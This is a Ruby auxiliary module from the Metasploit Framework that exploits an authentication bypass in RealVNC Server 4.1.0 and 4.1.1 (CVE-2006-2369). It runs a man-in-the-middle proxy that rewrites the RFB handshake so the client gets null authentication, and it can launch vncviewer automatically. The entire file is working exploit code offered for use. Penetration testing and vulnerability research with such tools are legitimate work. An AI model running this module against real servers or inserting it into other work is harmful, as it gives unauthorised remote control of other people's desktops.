# $Id: realvnc_41_bypass.rb 13641 2011-08-26 04:40:21Z bannedit $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
 
class Metasploit3 < Msf::Auxiliary
    include Msf::Exploit::Remote::Tcp
     
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;RealVNC Authentication Bypass&#039;,
            &#039;Description&#039;    => %q{
                This module exploits an Authentication Bypass Vulnerability
                in RealVNC Server version 4.1.0 and 4.1.1. It sets up a proxy
                listener on LPORT and proxies to the target server
 
                The AUTOVNC option requires that vncviewer be installed on
                the attacking machine. This option should be disabled for Pro
            },
            &#039;Author&#039;         =>
                [
                    &#039;hdm&#039;, #original msf2 module
                    &#039;TheLightCosine <thelightcosine[at]gmail.com>&#039;
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 13641 $&#039;,
            &#039;References&#039;     =>
                [
                    [&#039;BID&#039;, &#039;17978&#039;],
                    [&#039;OSVDB&#039;, &#039;25479&#039;],
                    [&#039;URL&#039;, &#039;http://secunia.com/advisories/20107/&#039;],
                    [&#039;CVE&#039;, &#039;CVE-2006-2369&#039;],
                ],
            &#039;DisclosureDate&#039; => &#039;May 15 2006&#039;))
 
        register_options(
            [
                OptAddress.new(&#039;RHOST&#039;, [true, &#039;The Target Host&#039;]),
                OptPort.new(&#039;RPORT&#039;,    [true, "The port the target VNC Server is listening on", 5900 ]),
                OptPort.new(&#039;LPORT&#039;,    [true, "The port the local VNC Proxy should listen on", 5900 ]),
                OptBool.new(&#039;AUTOVNC&#039;,  [true, "Automatically Launch vncviewer from this host", true])
            ], self.class)
    end
 
    def run
        #starts up the Listener Server
        print_status("starting listener")
        listener = Rex::Socket::TcpServer.create(
                &#039;LocalHost&#039; => &#039;0.0.0.0&#039;,
                &#039;LocalPort&#039; => datastore[&#039;LPORT&#039;],
                &#039;Context&#039;   => { &#039;Msf&#039; => framework, &#039;MsfExploit&#039; => self }
            )
 
        #If the autovnc option is set to true this will spawn a vncviewer on the lcoal machine
        #targetting the proxy listener.
        if (datastore[&#039;AUTOVNC&#039;])
            unless (check_vncviewer())
                print_error("vncviewer does not appear to be installed, exiting!!!")
                return nil
            end
            print_status("Spawning viewer thread") 
            view = framework.threads.spawn("VncViewerWrapper", false) {
                    system("vncviewer 127.0.0.1::#{datastore[&#039;LPORT&#039;]}")
            }
        end
 
        #Establishes the connection between the viewier and the remote server
        client = listener.accept
        add_socket(client)
 
        s = Rex::Socket::Tcp.create(
                &#039;PeerHost&#039; => datastore[&#039;RHOST&#039;],
                &#039;PeerPort&#039; => datastore[&#039;RPORT&#039;],
                &#039;Timeout&#039; => 1
                )
        add_socket(s)
        serverhello = s.gets
        unless serverhello.include? "RFB 003.008"
            print_error("The VNCServer is not vulnerable")
            return
        end
 
        #MitM attack on the VNC Authentication Process
        client.puts(serverhello)
        clienthello = client.gets
        s.puts(clienthello)
        authmethods = s.recv(2)
        print_status("Auth Methods Recieved. Sending Null Authentication Option to Client")
        client.write("\x01\x01")
        client.recv(1)
        s.write("\x01")
        s.recv(4)
        client.write("\x00\x00\x00\x00")
 
        #handles remaining proxy operations between the two sockets
        closed = false
        while(closed == false)
            sockets =[]
            sockets << client
            sockets << s
            selected = select(sockets,nil,nil,0)
            #print_status ("Selected: #{selected.inspect}")
            unless selected.nil?
                if selected[0].include?(client)
                    #print_status("Transfering from client to server")
                    begin
                        data = client.sysread(8192)
                        if data.nil?
                            print_error("Client Closed Connection")
                            closed = true
                        else
                            s.write(data)
                        end
                    rescue
                        print_error("Client Closed Connection")
                        closed = true
                    end
                end
                if selected[0].include?(s)
                    #print_status("Transfering from server to client")
                    begin
                        data = s.sysread(8192)
                        if data.nil?
                            print_error("Server Closed Connection")
                            closed = true
                        else
                            client.write(data)
                        end
                    rescue
                        closed = true
                    end
                end
            end
        end
 
        #Garbage Collection
        s.close
        client.close
        print_status("Listener Closed")
 
        if (datastore[&#039;AUTOVNC&#039;])
            view.kill
            print_status("Viewer Closed")
        end
    end
 
    def check_vncviewer
        vnc =
            Rex::FileUtils::find_full_path(&#039;vncviewer&#039;) ||
            Rex::FileUtils::find_full_path(&#039;vncviewer.exe&#039;)
        if (vnc)
            return true
        else
            return false
        end
    end
end



